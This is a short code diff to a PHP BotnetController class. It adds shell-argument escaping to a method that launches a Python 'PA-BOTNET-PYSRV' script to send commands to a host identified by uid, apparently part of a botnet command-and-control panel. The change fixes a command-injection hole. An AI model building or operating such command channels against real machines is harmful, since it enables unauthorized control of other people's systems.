@@ -243,7 +243,8 @@ class BotnetController extends Controller
 
     public function command($uid, $value){
         $path = env('PATH_PYTHON_EXECUTABLE');
-
+        $value = escapeshellarg($value);
+        
         $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --command --value ".$value." --host ".$uid." > /dev/null 2>&1 & echo $!";
         exec($command, $output, $return);
 
